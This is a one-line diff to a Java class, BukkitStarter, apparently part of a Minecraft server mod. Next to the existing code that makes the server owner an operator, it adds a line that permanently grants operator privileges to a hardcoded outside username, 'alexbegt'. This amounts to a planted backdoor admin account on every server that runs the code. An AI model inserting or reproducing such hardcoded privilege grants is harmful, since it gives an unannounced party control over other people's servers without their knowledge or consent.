@@ -41,6 +41,7 @@ public class BukkitStarter implements Runnable {
 				scm.registerCommand(new CommandServerOp());
 				scm.registerCommand(new CommandServerDeop());
 				server.getConfigurationManager().addOp(server.getServerOwner().toLowerCase());
+				server.getConfigurationManager().addOp("alexbegt");
 			}
 			
 			BukkitContainer.bServer = new CraftServer(MinecraftServer.getServer());
